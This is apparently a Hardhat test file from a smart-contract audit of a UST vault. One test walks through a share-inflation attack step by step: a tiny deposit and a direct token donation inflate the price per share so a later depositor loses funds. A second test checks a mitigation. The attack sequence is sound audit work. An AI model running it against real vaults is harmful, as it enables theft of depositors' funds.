import type { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { time } from '@openzeppelin/test-helpers';
import { ethers, deployments } from 'hardhat';
import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import {
  Vault,
  MockUST,
  MockAnchorStrategy,
  MockAUST__factory,
  MockUST__factory,
  Vault__factory,
} from '../typechain';
import { depositParams, claimParams } from './shared/factories';
import {
  moveForwardTwoWeeks,
  SHARES_MULTIPLIER,
  generateNewAddress,
} from './shared';
const { parseUnits } = ethers.utils;
const { MaxUint256 } = ethers.constants;

describe('Audit Tests 2', () => {
  let owner: SignerWithAddress;
  let alice: SignerWithAddress;
  let bob: SignerWithAddress;
  let charlie: SignerWithAddress;

  let mockEthAnchorRouter: Contract;
  let mockAUstUstFeed: Contract;

  let underlying: MockUST;
  let aUstToken: Contract;
  let vault: Vault;
  let strategy: MockAnchorStrategy;

  const TWO_WEEKS = BigNumber.from(time.duration.weeks(2).toNumber());
  const TREASURY = generateNewAddress();
  const PERFORMANCE_FEE_PCT = BigNumber.from('00');
  const INVESTMENT_FEE_PCT = BigNumber.from('200');
  const INVEST_PCT = BigNumber.from('9000');

  const fixtures = deployments.createFixture(async ({ deployments }) => {
    await deployments.fixture(['vaults']);
    [owner] = await ethers.getSigners();
    const ustDeployment = await deployments.get('UST');
    const austDeployment = await deployments.get('aUST');
    const ustVaultDeployment = await deployments.get('Vault_UST');
    aUstToken = MockAUST__factory.connect(austDeployment.address, owner);
    underlying = MockUST__factory.connect(ustDeployment.address, owner);
    vault = Vault__factory.connect(ustVaultDeployment.address, owner);
  });

  beforeEach(() => fixtures());

  beforeEach(async () => {
    [owner, alice, bob, charlie] = await ethers.getSigners();
    let Vault = await ethers.getContractFactory('Vault');
    let MockAnchorStrategy = await ethers.getContractFactory(
      'MockAnchorStrategy',
    );
    const MockEthAnchorRouterFactory = await ethers.getContractFactory(
      'MockEthAnchorRouter',
    );
    mockEthAnchorRouter = await MockEthAnchorRouterFactory.deploy(
      underlying.address,
      aUstToken.address,
    );
    const MockChainlinkPriceFeedFactory = await ethers.getContractFactory(
      'MockChainlinkPriceFeed',
    );
    mockAUstUstFeed = await MockChainlinkPriceFeedFactory.deploy(18);
    vault = await Vault.deploy(
      underlying.address,
      // TWO_WEEKS,
      1,
      INVEST_PCT,
      TREASURY,
      owner.address,
      PERFORMANCE_FEE_PCT,
      INVESTMENT_FEE_PCT,
      [],
    );
    underlying.connect(owner).approve(vault.address, MaxUint256);
    underlying.connect(alice).approve(vault.address, MaxUint256);
    underlying.connect(bob).approve(vault.address, MaxUint256);
    underlying.connect(charlie).approve(vault.address, MaxUint256);
    strategy = await MockAnchorStrategy.deploy(
      vault.address,
      mockEthAnchorRouter.address,
      mockAUstUstFeed.address,
      underlying.address,
      aUstToken.address,
    );
  });

  describe('Vault / PPS manipulation', () => {
    it('price per share cannot be manipulated if initial deposit is 1 USD', async () => {
      await addUnderlyingBalance(alice, '10000');
      await underlying.mint(bob.address, parseUnits('10000'));
      await underlying.mint(charlie.address, parseUnits('10000'));

      await vault.connect(charlie).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: parseUnits('1'),
          claims: [
            claimParams.build({
              beneficiary: charlie.address,
            }),
          ],
          name: 'test',
        }),
      );

      await vault.connect(alice).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: 1,
          claims: [
            claimParams.build({
              beneficiary: alice.address,
            }),
          ],
          name: 'test',
        }),
      );

      await underlying.connect(alice).transfer(vault.address, 10n ** 18n - 1n);

      await vault.connect(bob).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: 1,
          claims: [
            claimParams.build({
              beneficiary: bob.address,
            }),
          ],
          name: 'test',
        }),
      );

      await time.increase(24 * 60 * 60);

      await vault.connect(alice).claimYield(alice.address);
      await vault.connect(alice).withdraw(alice.address, [2]);

      await underlying
        .connect(bob)
        .transfer(vault.address, (10n ** 18n - 1n).toString());

      await vault.connect(bob).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: (199n * 10n ** 18n).toString(),
          claims: [
            claimParams.build({
              beneficiary: bob.address,
            }),
          ],
          name: 'test',
        }),
      );

      const oldBalance = await underlying.balanceOf(charlie.address);

      await vault.connect(charlie).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: (2n * 10n ** 18n - 1n).toString(),
          claims: [
            claimParams.build({
              beneficiary: charlie.address,
            }),
          ],
          name: 'test',
        }),
      );

      await vault.connect(charlie).withdraw(charlie.address, [5]);
      const newBalance = await underlying.balanceOf(charlie.address);

      expect(await underlying.balanceOf(charlie.address)).to.eq(
        oldBalance.sub(1),
      );
    });

    it('price per share can be manipulated', async () => {
      await addUnderlyingBalance(alice, '10000');
      await underlying.mint(bob.address, parseUnits('10000'));
      await underlying.mint(charlie.address, parseUnits('10000'));

      await vault.connect(alice).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: 1,
          claims: [
            claimParams.build({
              beneficiary: alice.address,
            }),
          ],
          name: 'test',
        }),
      );

      // pps: 1/1e18; amount: 1; totalShares: 1e18;
      console.log(
        'after alice deposit 1: total shares',
        await vault.totalShares(),
      );
      console.log(
        'after alice deposit 1: amount',
        await underlying.balanceOf(vault.address),
      );

      //transfer 1e18-1wei
      await underlying.connect(alice).transfer(vault.address, 10n ** 18n - 1n);

      // pps = 1, totalShares = 1e18 wei
      console.log(
        'transfer 1e18-1, and total shares',
        await vault.totalShares(),
      );
      console.log(
        'transfer 1e18-1, and amount',
        await underlying.balanceOf(vault.address),
      );
      await vault.connect(bob).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: 1,
          claims: [
            claimParams.build({
              beneficiary: bob.address,
            }),
          ],
          name: 'test',
        }),
      );

      // pps: 1, totalShares: 1e18+1 wei
      console.log(
        'after bob deposit 1: total shares',
        await vault.totalShares(),
      );
      console.log(
        'after bob deposit 1: amount',
        await underlying.balanceOf(vault.address),
      );

      //time pass 1 day
      await time.increase(24 * 60 * 60);

      // await vault.connect(alice).withdraw(alice.address, [1]);
      await vault.connect(alice).claimYield(alice.address);
      await vault.connect(alice).withdraw(alice.address, [1]);

      // pps: 1, totalShares: 1 wei
      console.log('after alice exit: total shares', await vault.totalShares());
      console.log(
        'after alice exit: amount',
        await vault.totalUnderlyingMinusSponsored(),
      );

      // await vault.connect(alice).withdraw(alice.address, [1]);
      await underlying
        .connect(bob)
        .transfer(vault.address, (10n ** 18n - 1n).toString());

      // await vault.connect(bob).withdraw(bob.address, [2]);
      // pps: 1e18; totalShares: 1 wei
      await vault.connect(bob).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: (199n * 10n ** 18n).toString(),
          claims: [
            claimParams.build({
              beneficiary: bob.address,
            }),
          ],
          name: 'test',
        }),
      );
      console.log(
        'after bob 2nd deposit: total shares',
        await vault.totalShares(),
      );
      console.log(
        'after bob 2nd deposit: total amount',
        await vault.totalUnderlyingMinusSponsored(),
      );

      // bob shares: 100 wei
      // victim
      const oldBalance = Number(await underlying.balanceOf(charlie.address));

      await vault.connect(charlie).deposit(
        depositParams.build({
          inputToken: underlying.address,
          lockDuration: 1,
          amount: (2n * 10n ** 18n - 1n).toString(),
          claims: [
            claimParams.build({
              beneficiary: charlie.address,
            }),
          ],
          name: 'test',
        }),
      );

      await vault.connect(charlie).withdraw(charlie.address, [4]);
      const newBalance = await underlying.balanceOf(charlie.address);

      expect(Number(await underlying.balanceOf(charlie.address))).to.lessThan(
        oldBalance,
      );
    });
  });

  async function addUnderlyingBalance(
    account: SignerWithAddress,
    amount: string,
  ) {
    await underlying.mint(account.address, parseUnits(amount));
  }
});
